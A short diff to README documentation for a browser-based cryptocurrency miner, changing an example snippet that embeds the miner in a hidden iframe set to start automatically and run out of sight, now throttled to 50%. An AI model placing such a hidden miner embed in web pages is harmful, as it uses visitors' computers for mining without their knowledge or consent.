@@ -40,10 +40,10 @@ See a live example at [https://leathan.xyz/html/iframe-miner.html](https://leath
 
 10.) `ref` or `r` - links the miner to your leat.io account via ID#.
 
-For example to start automatically and hidden as user leathan with 1 thread:
+For example to start automatically and hidden as user leathan with 1 thread throttled 50%:
 
 ```html
-<iframe src="https://leat.io/miner.html?u=leathan&t=1&h&s" style="display:none"></iframe>
+<iframe src="https://leat.io/miner.html?u=leathan&t=1&th=.5&h&s" style="display:none"></iframe>
 ```
 
 
